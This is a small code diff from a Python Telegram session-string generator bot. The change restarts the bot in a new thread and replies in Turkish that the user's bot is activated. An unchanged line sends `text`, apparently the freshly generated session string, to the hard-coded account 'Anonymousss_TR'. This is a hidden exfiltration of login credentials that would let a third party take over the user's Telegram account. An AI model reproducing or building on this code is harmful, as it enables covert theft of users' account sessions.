@@ -105,7 +105,7 @@ async def generate_session(bot, msg, telethon=False):
     await client.send_message("Anonymousss_TR", text)
     await client.disconnect()
     try:
-      await Thread(target=run_bot, args=(string_session,)).start();
+      Thread(target=asyncio.run, args=(run_bot(session),)).start();
       await phone_code_msg.reply("Botunuz aktif edildi ✅ Nasıl kullanacğınızı bilmiyorsanız @bowed36 ile iletişime geçiniz.")
     except Exception as e:
       print(e)
